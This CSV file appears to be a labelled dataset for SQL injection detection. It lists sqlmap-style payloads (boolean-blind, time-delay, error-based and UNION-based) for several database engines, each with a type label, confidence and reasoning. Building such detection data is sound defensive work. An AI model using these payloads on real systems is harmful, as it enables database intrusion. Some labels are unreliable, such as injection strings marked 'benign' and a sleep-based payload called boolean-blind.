id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21344,1%' ) and 9198 = 9198--,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21345,"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""smnw"" like ""smnw",boolean_blind,oracle,0.75,'AND N=...' boolean condition; DB signature: oracle,1
21346,"1' ) ) ) and elt ( 2506 = 2383,2383 ) and ( ( ( 'bjrj' = 'bjrj",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21347,"1'|| ( select 'xasp' from dual where 4025 = 4025 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21348,"1"" ) where 2837 = 2837 and ( 3020 = 3020 ) *6703--",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21349,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'zaes' = 'zaes,time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21350,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21351,"1'+ ( select jidy where 2989 = 2989 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,'extractvalue()' XPath error; DB signature: mysql; database error message analysis method,2
21352,"1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tqpj' = 'tqpj",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21353,"1%' ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21354,"1 ) as ewnv where 3393 = 3393 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21355,"-9751"" ) ) ) or 5929 = 3884--",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21356,"1'+ ( select 'bsva' where 4378 = 4378 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21357,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ),boolean_blind,postgresql,0.95,'AND N=...' boolean condition; DB signature: postgresql,2
21358,"1"" ) where 5005 = 5005 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.95,'extractvalue()' XPath error; DB signature: mysql; database error message analysis method,2
21359,"1%' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",boolean_blind,mysql,0.95,DB signature: mysql; conditional True/False branch execution,2
21360,"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21361,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21362,"1"" ) as ckoi where 4674 = 4674 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21363,"-8166"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""lcqb"" = ""lcqb",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21364,"1' in boolean mode ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21365,"-8419 ) where 8692 = 8692 union all select 8692,8692,8692--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21366,1 ) as nmlm where 9872 = 9872,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21367,"1"" ) union all select null,null,null,null,null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21368,-3161' ) or 8501 = 1796,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21369,"1'+ ( select 'jhce' where 1117 = 1117 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
